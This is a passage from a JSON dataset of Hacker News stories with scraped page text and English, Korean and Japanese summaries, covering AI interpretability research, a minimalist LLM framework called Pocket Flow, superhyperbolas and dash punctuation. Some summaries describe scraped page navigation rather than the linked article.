      "ja": "このテキストは、Claudeのような大規模言語モデルがどのように考え、動作するかを理解するための研究について述べています。主なポイントは以下の通りです。\n\n言語モデルであるClaudeは、大量のデータから学習し、人間が直接プログラムしたわけではない独自の問題解決戦略を発展させます。このため、モデルの動作を理解することは重要です。特に、多言語能力や文章の計画、推論プロセスを理解することで、意図した通りに機能するかを確認できます。\n\n研究の結果、Claudeは異なる言語間で概念的な理解を共有していることがわかりました。これは、普遍的な思考プロセスを示しています。また、詩を書く際には先を見越した計画を立てることができ、高度な計画能力を示しています。さらに、Claudeは計算問題に対して、近似的な計算と正確な計算を組み合わせる複数の戦略を用いています。しかし、難しい質問に直面した際には、正確なステップに従うのではなく、論理的な推論を作り上げることもあります。\n\nこの研究では、モデルの内部動作を観察するために「顕微鏡」のような新しい解釈技術を利用しました。これにより、モデルの行動や思考プロセスに関する洞察が得られました。研究者たちは、Claudeが韻を計画したり、単に答えを暗記するのではなく、洗練された推論を示すなど、予想外の能力を発見しました。\n\nただし、現在の方法ではモデルの計算の一部しか捉えられず、複雑な相互作用を理解するには多くの努力が必要です。これらの洞察は、AIシステムがますます高度化し、重要なアプリケーションに統合される中で重要です。透明性と信頼性が求められています。\n\nこの研究は、AIシステムの理解を深め、人間の価値観に沿った信頼できるものにすることを目指しています。"
    }
  },
  {
    "id": "b833c6b717e3d999",
    "title": {
      "en": "Scammers Steal $1T a Year – Mostly from Americans",
      "ko": "사기꾼, 연간 1조 달러 탈취!",
      "ja": "詐欺師が年1兆ドル盗む"
    },
    "type": "story",
    "url": "https://www.wired.com/video/watch/incognito-mode-romance-scams",
    "score": 99,
    "by": "vinni2",
    "time": 1743237597,
    "content": "Trending videoiconPlayKeanu Reeves Answers Motorcycle Questions With Gard HollingericonPlaySurgeon Answers Transplant QuestionsiconPlayKe Huy Quan Answers The Web's Most Searched QuestionsiconPlayAlan Ritchson Answers The Web's Most Searched QuestionsiconPlayHistory Professor Answers Dictator QuestionsiconPlayDungeon Master Brennan Lee Mulligan Answers DnD QuestionsiconPlayThe Righteous Gemstones Cast Answer The 50 Most Googled Questions About The ShowiconPlayWhy Gutting USAID Will Hurt AmericaiconPlayWe Mapped Elon Musk's Entire EmpireiconPlayProfessor Answers AI Questions",
    "summary": {
      "en": "Here’s a simplified summary of the text:\n\n- There are various trending videos where different individuals answer popular questions. \n- Keanu Reeves talks about motorcycles, a surgeon discusses transplant questions, and actor Ke Huy Quan addresses commonly searched questions.\n- Other videos feature a history professor answering questions about dictators, a Dungeon Master discussing Dungeons and Dragons (DnD), and the cast of \"The Righteous Gemstones\" answering questions about their show.\n- Additionally, there are videos discussing the impact of cutting USAID and mapping Elon Musk's business ventures, along with a professor answering questions about artificial intelligence (AI).",
      "ko": "최근 다양한 인기 질문에 대한 답변을 하는 여러 사람들의 트렌디한 영상들이 화제를 모으고 있습니다. 키아누 리브스는 오토바이에 대해 이야기하고, 한 외과 의사는 장기 이식에 관한 질문을 다룹니다. 배우 케 후이 콴은 사람들이 자주 검색하는 질문에 답변합니다. \n\n또한 역사 교수는 독재자에 대한 질문에 답하고, 던전 마스터는 '던전 앤 드래곤'에 대해 이야기합니다. '더 라이트지스 젬스톤스'의 출연진도 그들의 쇼에 관한 질문에 답변하는 영상이 있습니다. \n\n이 외에도 미국의 해외 원조 삭감의 영향과 일론 머스크의 사업을 정리한 영상, 인공지능(AI)에 대한 질문에 답하는 교수의 영상도 포함되어 있습니다.",
      "ja": "さまざまなトレンドの動画があり、異なる人々が人気の質問に答えています。キアヌ・リーブスはバイクについて語り、外科医は移植に関する質問を扱っています。また、俳優のキー・ホイ・クァンはよく検索される質問に答えています。その他にも、歴史の教授が独裁者についての質問に答えたり、ダンジョンマスターが「ダンジョンズ＆ドラゴンズ」について話したり、「ザ・ライトゥス・ジェムストーンズ」のキャストが自分たちの番組に関する質問に答えたりする動画もあります。さらに、アメリカの対外援助を削減する影響やイーロン・マスクのビジネス展開を地図で示す動画、人工知能（AI）についての質問に答える教授の動画もあります。"
    }
  },
  {
    "id": "f40cf8f6b86c632d",
    "title": {
      "en": "Launch HN: Continue (YC S23) – Create custom AI code assistants",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://hub.continue.dev/explore/assistants",
    "score": 175,
    "by": "sestinj",
    "time": 1743087986,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e8062a57157811b3",
    "title": {
      "en": "I Built an LLM Framework in Just 100 Lines – Here Is Why",
      "ko": "100줄로 만든 LLM 프레임워크!",
      "ja": "100行で作ったLLMフレームワークの理由"
    },
    "type": "story",
    "url": "https://zacharyhuang.substack.com/p/i-built-an-llm-framework-in-just",
    "score": 9,
    "by": "zh2408",
    "time": 1743287267,
    "content": "Share this postPocket FlowI Built an LLM Framework in just 100 Lines — Here is WhyCopy linkFacebookEmailNotesMoreDiscover more from Pocket FlowPocket Flow: 100-line LLM framework for Agentic CodingSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inI Built an LLM Framework in just 100 Lines — Here is WhyZachary HuangMar 04, 20255Share this postPocket FlowI Built an LLM Framework in just 100 Lines — Here is WhyCopy linkFacebookEmailNotesMore21ShareHave you ever stared at a complex AI framework and wondered, “Does it really need to be this complicated?” After a year of struggling with bloated frameworks, I decided to strip away anything unnecessary. The result is Pocket Flow, a minimalist LLM framework in just 100 lines of code.Current LLM Frameworks Are Bloated!For the past year, I’ve been building AI applications using popular frameworks like LangChain. The experience has been consistently frustrating:Bloated Abstraction: As Octomind’s engineering team explains: “LangChain was helpful at first when our simple requirements aligned with its usage presumptions. But its high-level abstractions soon made our code more difficult to understand and frustrating to maintain.” These frameworks hide simple functionality behind unnecessary complexity.Implementation Nightmares: Beyond the abstractions, these frameworks burden developers with dependency bloat, version conflicts, and constantly changing interfaces. Developers often complain: “It’s unstable, the interface constantly changes, the documentation is regularly out of date.” Another developer jokes: “In the time it took to read this sentence langchain deprecated 4 classes without updating documentation.”This led me to wonder: Do we really need so many wrappers? What if we stripped everything away? What is truly minimal and viable?Enter Pocket Flow: 100 Lines For the Core AbstractionAfter a year of building LLM applications from scratch, I had a revelation: beneath all the complexity, LLM systems are fundamentally just simple directed graphs. By stripping away the unnecessary layers, I created Pocket Flow — a framework with zero bloat, zero dependencies, and zero vendor lock-in, all in just 100 lines of code.Comparison of AI system frameworks for abstraction, application-specific wrappers, vendor-specific wrappers, lines of code, and size.The Simple Building BlocksThink of Pocket Flow like a well-organized kitchen:Nodes are like cooking stations (chopping, cooking, plating)Flow is the recipe dictating which station to visit nextShared store is the countertop where ingredients are visible to all stationsIn our kitchen (agent system):Each station (Node) performs three simple operations:Prep: Retrieve what you need from the shared store (gather ingredients)Exec: Perform your specialized task (cook the ingredients)Post: Return results to the shared store and determine next steps (serve the dish and decide what to make next)The recipe (Flow) directs execution based on conditions:“If vegetables are chopped, proceed to cooking station”“If meal is cooked, move to plating station”We also support batch processing, asynchronous execution, and parallel processing for both nodes and flows. And that’s it! That’s all you need to build LLM applications. No unnecessary abstractions, no complex architecture — just simple building blocks that can be composed to create powerful systems.Pocket Flow Core Graph AbstractionWhat About Wrappers Like OpenAI?Unlike other frameworks, Pocket Flow deliberately avoids bundling vendor-specific APIs. Here’s why:No Dependency Issues: Current LLM frameworks come with hundreds of MBs of dependencies. Pocket Flow has zero dependencies, keeping your project lean and nimble.No Vendor Lock-in: You’re free to use any model you want, including local models like OpenLLaMA, without changing your core architecture.Customized Full Control: Want prompt caching, batching, and streaming? Build exactly what you need without fighting against pre-baked abstractions.What if you need an API wrapper? Just ask models like ChatGPT to write one on-the-fly. It’s usually just 20 lines of code. This approach is far more flexible than rigid built-in wrappers or abstractions that quickly become outdated.With this minimal but powerful building blocks, you can build sophisticated agents, RAG systems, and LLM workflows with complete transparency and control over every component. Let’s see an example!Let’s build a Web Search Agent with Pocket FlowLet’s build a simple web search agent using the building blocks from Pocket Flow. Such a simple web search AI agent that can search the web and answer questions — similar to tools like Perplexity AI.The Flow DesignHere’s the agent’s behavior modeled as a simple flow graph:What Happens at Each Node?DecideAction — “Should we search the web, or do we already know enough?”Prep: Pulls in the original question and any previous search context from shared memoryExec: Asks the LLM whether to perform a web search or answer directlyPost: Saves a search query if needed, and returns either \"search\" or \"answer\" as the next actionSearchWeb — “Let’s go fetch some fresh information.”Prep: Retrieves the query generated in the last stepExec: Calls a web search API (Google, Bing, etc.), fetches results, and distills them into readable chunksPost: Adds the search results back into context, then loops back to DecideAction for re-evaluationAnswerQuestion — “We’ve got enough info — let’s answer the question.”Prep: Collects the question and all search contextExec: Prompts the LLM to generate a well-researched, helpful answerPost: Stores the final response and signals \"done\" to finish the flowThe graph is dynamic, transparent, and easy to extend. You can plug in different LLMs, swap out the search engine, or insert new decision points — without ever breaking the core logic.Let’s Walk Through an ExampleImagine you asked our agent: “Who won the 2023 Super Bowl?” Here’s what would happen step-by-step for each node:DecideAction Node:LOOKS AT: Your question and what we know so far (nothing yet)THINKS: “I don’t know who won the 2023 Super Bowl, I need to search”DECIDES: Search for “2023 Super Bowl winner”PASSES TO: SearchWeb stationSearchWeb Node:LOOKS AT: The search query “2023 Super Bowl winner”DOES: Searches the internet (imagine it finds “The Kansas City Chiefs won”)SAVES: The search results to our shared countertopPASSES TO: Back to DecideAction stationDecideAction Node(second time):LOOKS AT: Your question and what we know now (search results)THINKS: “Great, now I know the Chiefs won the 2023 Super Bowl”DECIDES: We have enough info to answerPASSES TO: AnswerQuestion stationAnswerQuestion Node:LOOKS AT: Your question and all our researchDOES: Creates a friendly answer using all the informationSAVES: The final answerFINISHES: The task is complete!And that’s it! Simple, elegant, and powered by search. The entire agent implementation requires just a few hundred lines of code, built on our 100-line framework. You can see the complete code and run it yourself using this cookbook!This is the essence of Pocket Flow: composable nodes and simple graphs creating smart, reactive AI agents. No hidden magic. No framework gymnastics. Just clear logic and complete control.What else can we build?Pocket Flow isn’t limited to search agents. Build everything you love — Multi-Agents, Workflows, RAG systems, Map-Reduce operations, Streaming, Supervisors, Chat Memory, Model Context Protocol, and more — all with the same elegant simplicity. Each implementation follows the same pattern: a few hundred lines of code built on first principles, with our minimal 100-line framework as the foundation.No unnecessary abstraction. No bloat. Instead of trying to understand a gigantic framework with hundreds of thousands of files, Pocket Flow gives you the fundamentals so you can build your own understanding from the ground up. Find complete tutorials for all these implementations in the Pocket Flow GitHub repository and explore our basic tutorials to get started.Design Patterns based on Pocket FlowFuture Vision of Pocket Flow: Agentic CodingThe true power of Pocket Flow extends beyond its minimalist design. Its most revolutionary aspect is enabling Agentic Coding — a new way of programming where AI assistants help you build and modify AI applications.What is Agentic Coding?Agentic coding is simply the practice of working alongside AI to build software. Think of it like building a house — you’re the architect with the vision and expertise, while the AI is your construction crew handling the detailed work:You focus on high-level design and strategic decisions (the human strength)The AI assistant handles implementation details and technical execution (the AI strength)You review and refine the results, guiding the processThis 10x productivity multiplier means you spend less time coding repetitive patterns and more time on creative problem-solving.Agentic Coding in ActionTeaching AI to Build LLM ApplicationsHow do we teach AI to build powerful LLM applications? Previous frameworks took the wrong approach — they create hard coded wrappers for specific applications like summarization, tagging, and web scraping that end up bewildering both human developers and AI assistants alike.Our solution is elegantly simple: Documentation as the second codebase! Instead of hard coded wrappers, vibe code them in documentation. Pocket Flow provides just 100 lines of core building blocks, paired with clear documentation that teaches how to combine these blocks into powerful applications. We simply provide examples and let AI agents implement solutions on the fly. This documentation-as-code approach allows AI assistants to:Master the fundamentals: Learn a small set of building blocks instead of drowning in framework complexityBuild customized solutions: Generate implementations perfectly tailored to specific application needsFocus on architecture: Think about system design rather than fighting framework limitationsWe pass these “instruction manuals” directly to AI assistants as rule files (e.g., .cursorrules for cursor AI), giving them the knowledge to build sophisticated systems from simple components.For deeper exploration of this approach, visit: Agentic Coding: The Most Fun Way to Build LLM Apps or check out my YouTube channel for more tutorials.The future vision is even more exciting: as Pocket Flow patterns spread through the developer ecosystem, they’ll eventually be absorbed into future LLMs’ training data. At that point, we won’t even need explicit documentation — AI assistants will intrinsically understand these principles, making LLM application development truly frictionless.Conclusion: Simplicity Is the Ultimate SophisticationPocket Flow strips away the complexity, offering just what you need: 100 lines of code that model LLM applications as simple directed graphs. No bloat, no magic, just transparent logic and complete control.If you’re tired of framework gymnastics and want to build your understanding from the ground up, Pocket Flow’s minimalist approach lets you create powerful agents today while preparing for the agentic coding revolution of tomorrow.Join our Discord community to connect with other developers building with Pocket Flow!Try Pocket Flow today and experience how 100 lines can replace hundreds of thousands! GitHub Repository | Documentation | TypeScript VersionSubscribe to Pocket FlowBy Zachary Huang · Launched a month agoPocket Flow: 100-line LLM framework for Agentic CodingSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.5Share this postPocket FlowI Built an LLM Framework in just 100 Lines — Here is WhyCopy linkFacebookEmailNotesMore21Share",
    "summary": {
      "en": "Zachary Huang created Pocket Flow, a minimalist framework for building AI applications with just 100 lines of code. After a year of frustration with complex existing frameworks like LangChain, which are bloated with unnecessary features and dependencies, he sought to simplify the process. Pocket Flow focuses on the core concept that LLM systems are essentially simple directed graphs, allowing developers to build applications without hidden complexities or vendor lock-in.\n\nKey features of Pocket Flow include:\n- **Simplicity**: It consists of basic building blocks that are easy to understand and use.\n- **No Dependencies**: Unlike other frameworks, it has zero dependencies, making projects lean and flexible.\n- **Customizability**: Developers can create tailored solutions without pre-existing constraints from larger frameworks.\n- **Agentic Coding**: This approach emphasizes collaboration with AI to enhance productivity, allowing developers to focus on design while AI handles implementation.\n\nPocket Flow can be used to create various AI systems, including web search agents, with transparency and control over the components involved. Its minimalist design aims to foster a better understanding of AI development, paving the way for future innovations in programming with AI assistance.",
      "ko": "자카리 황은 단 100줄의 코드로 AI 애플리케이션을 구축할 수 있는 미니멀리스트 프레임워크인 포켓 플로우를 만들었습니다. 그는 복잡한 기존 프레임워크인 랭체인에 대한 불만을 느끼며, 불필요한 기능과 의존성으로 인해 어려움을 겪은 끝에 이 과정을 단순화하고자 했습니다. 포켓 플로우는 LLM 시스템이 본질적으로 간단한 방향 그래프라는 핵심 개념에 초점을 맞추어, 개발자들이 숨겨진 복잡성이나 특정 공급업체에 종속되지 않고 애플리케이션을 구축할 수 있도록 합니다.\n\n포켓 플로우의 주요 특징은 다음과 같습니다. 첫째, 단순성입니다. 기본적인 구성 요소로 이루어져 있어 이해하고 사용하기 쉽습니다. 둘째, 의존성이 없습니다. 다른 프레임워크와 달리 의존성이 전혀 없어 프로젝트가 간결하고 유연합니다. 셋째, 맞춤화 가능성입니다. 개발자들은 대형 프레임워크의 기존 제약 없이 자신만의 솔루션을 만들 수 있습니다. 넷째, 에이전틱 코딩입니다. 이 접근 방식은 AI와의 협업을 강조하여 생산성을 높이고, 개발자가 디자인에 집중할 수 있도록 하며 AI가 구현을 담당하게 합니다.\n\n포켓 플로우는 웹 검색 에이전트를 포함한 다양한 AI 시스템을 투명하게 만들 수 있으며, 관련 구성 요소에 대한 제어를 제공합니다. 이 미니멀리스트 디자인은 AI 개발에 대한 더 나은 이해를 촉진하고, AI 지원 프로그래밍의 미래 혁신을 위한 길을 열어줍니다.",
      "ja": "ザカリー・ファンは、わずか100行のコードでAIアプリケーションを構築できるミニマリストフレームワーク「Pocket Flow」を開発しました。彼は、LangChainのような複雑で不要な機能や依存関係が多い既存のフレームワークに一年間苦しんだ後、プロセスを簡素化することを目指しました。Pocket Flowは、LLM（大規模言語モデル）システムが本質的にシンプルな有向グラフであるという核心概念に焦点を当てており、開発者が隠れた複雑さやベンダーロックインなしでアプリケーションを構築できるようにしています。\n\nPocket Flowの主な特徴は、シンプルさです。基本的な構成要素で構成されており、理解しやすく使いやすいです。また、他のフレームワークとは異なり、依存関係がゼロであるため、プロジェクトはスリムで柔軟です。開発者は、大規模なフレームワークからの事前の制約なしに、カスタマイズされたソリューションを作成できます。エージェンティックコーディングというアプローチは、AIとの協力を強調し、生産性を向上させることを目的としています。これにより、開発者は設計に集中し、AIが実装を担当します。\n\nPocket Flowは、ウェブ検索エージェントを含むさまざまなAIシステムを作成するために使用でき、関与するコンポーネントに対する透明性と制御を提供します。そのミニマリストなデザインは、AI開発の理解を深め、AI支援によるプログラミングの未来の革新への道を開くことを目指しています。"
    }
  },
  {
    "id": "bd620a437d6eb2ae",
    "title": {
      "en": "Superhyperbola",
      "ko": "슈퍼하이퍼볼라",
      "ja": "超放物線"
    },
    "type": "story",
    "url": "https://www.johndcook.com/blog/2025/03/27/superhyperbola/",
    "score": 62,
    "by": "jihadjihad",
    "time": 1743186321,
    "content": "Superhyperbola\n\n\t\t\tPosted on 27 March 2025 by John\n\n\t\tAn ellipse has equation\n\nand a hyperbola has equation\n\nSimilarly the superellipse has equation\n\nand the superhyperbola\n\nWhen p = 2, the absolute value signs are unnecessary and the superellipse and superhyperbola reduce to the ellipse and hyperbola respectively.\nIncreasingp makes the superellipse more like a rectangle. But unlike a rectangle with rounded corners, the change in curvature is continuous.\n\nIncreasingp makes the superhyperbola more blunt at the vertices.\n\nMarketing\nThe superellipse is a fairly well known variation on an ellipse. Even if you’re not familiar the term, you’ve probably seen the shape. I give a couple examples here. The superhyperbola is the obvious analog of a superellipse, but the term is far less common. I’d never hear the term until yesterday.\nIt’s not clear why the superellipse would be common and the superhyperbola obscure, but here’s some speculation. First of all, the superellipse had an advocate, Piet Hein. If the superhyperbola has an advocate, he’s not a very effective advocate.\nThe name is also off-putting: juxtaposing super andhyper sounds silly. The etymology makes sense, even if it sounds funny. Piet Hein used the prefixsuper– to refer to increasing the exponent from the usual value of 2. Its unfortunate thathyperbola begins with a root that is similar tosuper.\nRelated posts\n\nApple design, squircles, and curvature\nSquircle corner radius\nSupereggs\n\n\t\t\t\tCategories : MathBookmark the permalink",
    "summary": {
      "en": "**Summary of Superhyperbola Post**\n\nThe post discusses the concept of superhyperbolas, which are mathematical shapes similar to superellipses but are less commonly known. \n\n- **Basic Definitions**: \n  - An ellipse has a specific equation, and a hyperbola has another. \n  - Superellipses and superhyperbolas extend these concepts with different equations based on a parameter (p).\n\n- **Characteristics**: \n  - When p = 2, superellipses and superhyperbolas revert to standard ellipses and hyperbolas.\n  - Increasing p makes superellipses look more rectangular while maintaining continuous curvature.\n  - Superhyperbolas become blunter at their vertices as p increases.\n\n- **Popularity**: \n  - Superellipses are more well-known, partly due to advocacy by Piet Hein, while superhyperbolas lack similar support.\n  - The term \"superhyperbola\" might sound silly, which could contribute to its obscurity.\n\nOverall, the post highlights the mathematical properties of superhyperbolas and speculates on why they are not as widely recognized as superellipses.",
      "ko": "이 글에서는 슈퍼하이퍼볼라라는 개념에 대해 설명합니다. 슈퍼하이퍼볼라는 수학적 형태로, 슈퍼엘립스와 유사하지만 덜 알려져 있습니다.\n\n먼저 기본 정의를 살펴보면, 엘립스는 특정한 방정식을 가지고 있고, 하이퍼볼라는 또 다른 방정식을 가집니다. 슈퍼엘립스와 슈퍼하이퍼볼라는 이러한 개념을 확장하여 매개변수(p)에 따라 다른 방정식을 사용합니다.\n\n특징적으로 p가 2일 때, 슈퍼엘립스와 슈퍼하이퍼볼라는 각각 표준 엘립스와 하이퍼볼라로 돌아갑니다. p의 값이 증가하면 슈퍼엘립스는 더 직사각형처럼 보이지만 연속적인 곡률을 유지합니다. 반면 슈퍼하이퍼볼라는 p가 증가할수록 꼭짓점에서 더 둥글어집니다.\n\n인기도 측면에서 슈퍼엘립스는 피에트 하인(Piet Hein)의 지지 덕분에 더 잘 알려져 있지만, 슈퍼하이퍼볼라는 비슷한 지원이 부족합니다. \"슈퍼하이퍼볼라\"라는 용어가 다소 우스꽝스럽게 들릴 수 있어 그 인지도가 낮아지는 데 기여할 수 있습니다.\n\n이 글은 슈퍼하이퍼볼라의 수학적 특성을 강조하며, 왜 슈퍼엘립스만큼 널리 알려지지 않았는지에 대한 추측을 제시합니다.",
      "ja": "この記事では、スーパーハイパーボラという数学的な形状について説明しています。スーパーハイパーボラはスーパーヘリプスに似ていますが、あまり知られていません。\n\nまず、基本的な定義について触れます。楕円には特定の方程式があり、双曲線には別の方程式があります。スーパーヘリプスとスーパーハイパーボラは、パラメータ（p）に基づいてこれらの概念を拡張したものです。\n\n特徴として、pが2のとき、スーパーヘリプスとスーパーハイパーボラは通常の楕円と双曲線に戻ります。pを増やすと、スーパーヘリプスはより長方形に見えますが、連続的な曲率を保ちます。一方、スーパーハイパーボラはpが増えるにつれて、その頂点が鈍くなります。\n\n人気の面では、スーパーヘリプスはピエト・ハインの支持により広く知られていますが、スーパーハイパーボラには同様の支持がありません。また、「スーパーハイパーボラ」という言葉が滑稽に聞こえるため、認知度が低いことも影響しているかもしれません。\n\n全体として、この記事はスーパーハイパーボラの数学的特性を強調し、なぜスーパーヘリプスほど広く認識されていないのかを考察しています。"
    }
  },
  {
    "id": "92403d609b4fdb25",
    "title": {
      "en": "How to Use Em Dashes (–), En Dashes (–), and Hyphens (-)",
      "ko": "대시와 하이픈 사용법",
      "ja": "ダッシュの使い方"
    },
    "type": "story",
    "url": "https://www.merriam-webster.com/grammar/em-dash-en-dash-how-to-use",
    "score": 618,
    "by": "Stratoscope",
    "time": 1743106778,
    "content": "How to Use Em Dashes (—), En Dashes (–) , and Hyphens (-)\n        Be dashing—and do it well\n\n                                    What is an Em Dash?\n\nThe em dash (—) can function like a comma, a colon, or parenthesis. Like commas and parentheses, em dashes set off extra information, such as examples, explanatory or descriptive phrases, or supplemental facts. Like a colon, an em dash introduces a clause that explains or expands upon something that precedes it.\n\nThe Em Dash Indicates a New Direction\n\nAn em dash can mark an abrupt change or break in the structure of a sentence.\n\n  Mabel the Cat was delighted with the assortment of pastries the new bakery featured, but Harry the Dog—he felt otherwise, for the bakery did not offer cheese Danishes at all.\n\nAn em dash can indicate interrupted speech or a speaker’s confusion or hesitation.\n\n  “Of course you have a point,” Mabel murmured. “That is—I suppose it is concerning.”\n\nThe Em Dash as Comma or Parenthesis\n\nEm dashes are used in place of commas or parentheses to emphasize or draw attention to parenthetical or amplifying material. In this particular task, em dashes occupy a kind of middle ground among the three: when commas do the job, the material is most closely related to what’s around it, and when parentheses do the job, the material is most distantly related to what’s around it; when dashes do the job the material is somewhere in the middle.\n\n  The bakery's significantly broad hours of operation—6 a.m. to 6 p.m.—certainly showed concern for customers’ manifold circumstances.\n\nDashes set off or introduce defining phrases and lists.\n\n  A regular selection of three kinds of croissants—plain, almond, and chocolate—was heartening, both Mabel and Harry agreed.\n\nAn em dash is often used in place of a colon or semicolon to link clauses, especially when the clause that follows the dash explains, summarizes, or expands upon the preceding clause in a somewhat dramatic way.\n\n  Harry would never forget the Tuesday that Mabel called him from the bakery, her voice brimming with excitement—the bakery had added cheese Danishes to its selection.\n\nAn em dash or pair of dashes often sets off illustrative or amplifying material introduced by such phrases as for example, namely, and that is, when the break in continuity is greater than that shown by a comma, or when the dash would clarify the sentence structure better than a comma.\n\n  The bakery was truly phenomenal. Although they did miss the mark somewhat with the pineapple upside-down cake Mabel ordered—that is, the cake had clearly been baked right-side up.\n\nAn em dash may introduce a summary statement that follows a series of words or phrases.\n\n  Chocolate chip, oatmeal raisin, peanut butter, snickerdoodle, both macarons and macaroons—the panoply of cookie varieties was impressive as well.\n\nA dash often precedes the name of an author or source at the end of a quoted passage—such as an epigraph, extract, or book or film blurb—that is not part of the main text. The attribution may appear immediately after the quotation or on the next line.\n\n  “One cannot overestimate the effect that a good bakery can have on a person’s well-being.” —Mabel the Cat, quoted in The Websterburg Reporter\n\nThe Em Dash in the Company of Other Punctuation Marks\n\nIf an em dash appears at a point where a comma could also appear, the comma is omitted.\n\n  Within its first year, Mabel and Harry had sampled all of the bakery’s offerings—all 62 items—and had also decided that the exercise was worth repeating.\n\nWhen a pair of em dashes sets off material ending with an exclamation point or a question mark, the mark is placed inside the dashes.\n\n  When the bakery closed for the month of August Mabel tried, despite her dolefulness—for how could she be otherwise?—to bake her own bread but each loaf that emerged from her oven tasted vaguely of tears.\n\nDashes are used inside parentheses, and vice versa, to indicate parenthetical material within parenthetical material. The second dash is omitted if it would immediately precede the closing parenthesis; a closing parenthesis is never omitted.\n\n  The bakery’s reputation for scrumptious goods (ambrosial, even—each item was surely fit for gods) spread far and wide.\n\nEm dash vs en dash\n\nRemembering that the em dash is the length of a capital M, it will surprise no one that the so-called “en dash” is the approximate length of a capital N, –. The en dash is the least loved of all; it’s not easily rendered by the average keyboard user (one has to select it as a special character, whereas the em dash can be conjured with two hyphens), so it’s mostly encountered in typeset material. (A hyphen does its job in other text.) It is most often used between numbers, dates, or other notations to signify “(up) to and including.”\n\n  The bakery will be closed August 1–August 31.\n\n  The bakery is open 6:00 a.m.–6:00 p.m.\n\n  The exceedingly complex recipe spans pages 128–34.\n\n  Mabel and Harry lived elsewhere 2007–2019.\n\nNote that one does not need words like from and between in these cases. The phrase “open 6:00 a.m.–6:00 p.m.” can be read as “open between 6:00 a.m. and 6:00 p.m.” or as “open from 6:00 a.m. to/until 6:00 p.m.”\n\nIf you want to be official about things, use the en dash to replace a hyphen in compound adjectives when at least one of the elements is a two-word compound.\n\n  the pre–Websterburg Bakery era\n\nThe thinking is that using a hyphen here, as in “the pre-Websterburg Bakery era,” risks the suggestion that pre attaches only to Websterburg. It’s unlikely, though, that a reader would truly be confused.\n\nThe en dash replaces the word to between capitalized names, and is used to indicate linkages such as boundaries, treaties, and oppositions.\n\n  a Springfield–Websterburg train\n\n  the pie–cake divide\n\nA two-em dash, ——, is used to indicate missing letters in a word and, less frequently, to indicate a missing word.\n\n  The butter-stained and crumb-embedded note was attributed to a Ms. M—— of Websterburg.\n\nA three-em dash, ———, indicates that a word has been left out or that an unknown word or figure is to be supplied.\n\n  Years later it was revealed that the Websterburg bakers had once had a bakery in ———, a city to the south. But the water quality there was prohibitive to the creating of decent bagels.\n\nHyphen use\n\nWhile we said above that the em dash, also called the “common dash,” is the most common of the true dashes, hyphens show up more frequently in text. They have a variety of uses.\n\nHyphens are used to link elements in compound words.\n\n  a baker-owner\n\nIn some words, a hyphen separates a prefix, suffix, or medial element from the rest of the word.\n\n  Websterburg’s pre-bakery days\n\n  a bread-like scone\n\n  jack-o'-lantern sugar cookies\n\nAs we noted above, a hyphen often does the job of an en dash between numbers and dates, providing the meaning \"(up) to and including.\"\n\n  pages 128-34\n\n  the years 2007-2019\n\nA hyphen marks an end-of-line division of a word.\n\n  Mabel and Harry don’t like to linger on their memories of Webster-\n  burg’s pre-bakery days.\n\nA hyphen divides letters or syllables to give the effect of stuttering, sobbing, or halting speech.\n\n  \"M-m-mabel, the cheese Danish is divine!”\n\nHyphens indicate a word spelled out letter by letter.\n\n  Let’s not even talk about August, when the bakery is c-l-o-s-e-d.\n\nThe em dash is sometimes considered a less formal equivalent of the colon and parenthesis, but in truth it’s used in all kinds of writing, including the most formal—the choice of which mark to use is really a matter of personal preference.\n\nSpacing around an em dash varies. Most newspapers insert a space before and after the dash, and many popular magazines do the same, but most books and journals omit spacing, closing whatever comes before and after the em dash right up next to it. This website prefers the latter, its style requiring the closely held em dash in running text.\n\n      Share",
    "summary": {
      "en": "**Summary of Em Dashes, En Dashes, and Hyphens**\n\n**Em Dash (—)**: \n- Used to separate extra information in a sentence, similar to commas or parentheses.\n- Indicates shifts in thought or breaks in sentence structure.\n- Can replace commas, colons, or parentheses for emphasis.\n- Often introduces examples or lists, and can link related clauses dramatically.\n- Used for interruptions in speech, and can highlight clarifying information.\n\n**En Dash (–)**:\n- Length of a capital \"N\"; used primarily for number ranges (e.g., dates or times) and to indicate connection between terms (e.g., \"Springfield–Websterburg\").\n- Replaces the word \"to\" in ranges and can substitute for a hyphen in certain compound adjectives.\n\n**Hyphen (-)**:\n- Links elements in compound words (e.g., \"baker-owner\").\n- Separates prefixes or suffixes from words (e.g., \"pre-bakery\").\n- Used for date ranges and to divide words at the end of lines.\n- Indicates stuttering in dialogue or spells out words letter by letter.\n\n**General Tips**:\n- Em dashes can be more informal than colons or parentheses but are versatile in all writing styles.\n- Spacing around em dashes varies; some prefer spacing while others keep text close to the dash.",
      "ko": "엠 대시(—)는 문장에서 추가 정보를 구분하는 데 사용되며, 쉼표나 괄호와 비슷한 역할을 합니다. 생각의 전환이나 문장 구조의 중단을 나타내기도 합니다. 강조를 위해 쉼표, 콜론, 괄호를 대체할 수 있으며, 예시나 목록을 소개할 때 자주 사용됩니다. 관련된 절을 극적으로 연결할 수도 있고, 대화 중에 끊김을 나타내거나 명확한 정보를 강조하는 데도 쓰입니다.\n\n엔 대시(–)는 대문자 \"N\"의 길이로, 주로 숫자 범위(예: 날짜나 시간)와 용어 간의 연결을 나타내는 데 사용됩니다. 범위에서 \"to\"라는 단어를 대체할 수 있으며, 특정 복합 형용사에서 하이픈을 대신할 수 있습니다.\n\n하이픈(-)은 복합어의 요소를 연결하는 데 사용됩니다. 예를 들어 \"baker-owner\"와 같은 형태입니다. 또한 접두사나 접미사를 단어와 분리하는 데 쓰이며, 날짜 범위를 나타내거나 줄 끝에서 단어를 나누는 데도 사용됩니다. 대화에서 더듬거림을 나타내거나 단어를 글자 단위로 철자할 때도 활용됩니다.\n\n엠 대시는 콜론이나 괄호보다 더 비공식적일 수 있지만, 모든 글쓰기 스타일에서 다양하게 사용될 수 있습니다. 엠 대시 주변의 간격은 사람마다 다르며, 어떤 이들은 간격을 두는 것을 선호하고, 다른 이들은 대시와 텍스트를 가깝게 유지하는 것을 선호합니다.",
